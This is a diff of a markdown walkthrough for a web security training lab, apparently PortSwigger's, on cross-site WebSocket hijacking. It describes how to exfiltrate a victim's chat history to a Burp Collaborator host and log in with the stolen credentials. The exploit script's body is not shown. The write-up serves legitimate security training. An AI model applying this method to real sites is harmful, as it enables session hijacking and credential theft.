@@ -5,44 +5,60 @@
 ---
 
 ## 🎯 Objective
-Perform a cross-site WebSocket hijacking (CSWSH) attack to exfiltrate the victim's chat history and retrieve their credentials.
+Perform a Cross-Site WebSocket Hijacking (CSWSH) attack to exfiltrate the victim's chat history containing their credentials, then login as the victim.
 
 ---
 
 ## 🪜 Steps
 
-### Step 1 — Start WebSocket chat
-Open the live chat, send a message, and capture the WebSocket handshake in Burp.
+### Step 1 — Open Live Chat and send a message
+Open the lab → click **Live Chat** → send: `hello`
 
-> 📸 Add screenshot here
+> 📸 Screenshot: `./screenshots/step1-livechat.png`
 
 ---
 
-### Step 2 — Identify the WebSocket handshake
-In **Proxy → WebSockets history**, find the `101 Switching Protocols` upgrade request.
-Note the WebSocket URL (e.g. `wss://YOUR-LAB-ID.web-security-academy.net/chat`).
+### Step 2 — Identify WebSocket handshake
+Go to **Burp → Proxy → HTTP history**.
 
-> 📸 Add screenshot here
+Find the request:
+```
+GET /chat HTTP/1.1
+Upgrade: websocket
+```
+
+> 📸 Screenshot: `./screenshots/step2-handshake.png`
 
 ---
 
 ### Step 3 — Copy the WebSocket URL
-Copy the full WebSocket endpoint URL for use in your exploit.
+Right-click the handshake request → **Copy URL**.
 
-> 📸 Add screenshot here
+Convert `https://` to `wss://`:
+```
+wss://YOUR-LAB-ID.web-security-academy.net/chat
+```
+
+Example from lab:
+```
+wss://0ab100fa04392e81808c03a400470081.web-security-academy.net/chat
+```
+
+> 📸 Screenshot: `./screenshots/step3-wsurl.png`
 
 ---
 
-### Step 4 — Generate Burp Collaborator payload
+### Step 4 — Generate Burp Collaborator URL
 Go to **Burp → Collaborator** → click **Copy to clipboard**.
-Save your Collaborator URL.
 
-> 📸 Add screenshot here
+Save your collaborator URL (e.g. `xxxx.oastify.com`).
+
+> 📸 Screenshot: `./screenshots/step4-collaborator.png`
 
 ---
 
-### Step 5 — Create the exploit
-On the **Exploit Server**, paste this in the body (replace URLs):
+### Step 5 — Create exploit on Exploit Server
+Go to the **Exploit Server**. In the body, paste:
 
 ```html
 <script>
@@ -60,31 +76,34 @@ On the **Exploit Server**, paste this in the body (replace URLs):
 </script>
 ```
 
-> 📸 Add screenshot here
+> 📸 Screenshot: `./screenshots/step5-exploit-server.png`
 
 ---
 
 ### Step 6 — Test the exploit
-Click **View exploit** to confirm it runs without errors.
+Click **View exploit**. Then go to **Burp → Collaborator → Poll now**.
 
-> 📸 Add screenshot here
+Confirm the collaborator receives data.
+
+> 📸 Screenshot: `./screenshots/step6-test.png`
 
 ---
 
 ### Step 7 — Deliver exploit to victim
-Click **Deliver to victim**.
+Click **Deliver exploit to victim**.
 
-> 📸 Add screenshot here
+Then again: **Burp → Collaborator → Poll now**.
+
+You receive the victim's chat history containing their **credentials**.
+
+> 📸 Screenshot: `./screenshots/step7-collaborator-data.png`
 
 ---
 
-### Step 8 — Check Collaborator
-Go back to **Burp Collaborator** → click **Poll now**.
-You'll see the victim's chat history including their credentials (e.g. `carlos:PASSWORD`).
+### Step 8 — Login as victim
+Use the credentials found in the chat history to login.
 
-Use those credentials to login as Carlos and solve the lab.
-
-> 📸 Add screenshot here
+> 📸 Screenshot: `./screenshots/step8-login.png`
 
 ---
 
@@ -94,4 +113,4 @@ Lab solved!
 ---
 
 ## 💡 Key Takeaway
-WebSocket connections don't follow CORS — they only check the `Origin` header during the handshake. If the server doesn't validate the origin, any site can open a WebSocket connection on behalf of the victim and exfiltrate data.
+WebSocket connections don't enforce CORS — they only check the `Origin` header during the handshake. If the server doesn't validate the origin, any malicious site can open a WebSocket on behalf of the victim and exfiltrate private data.
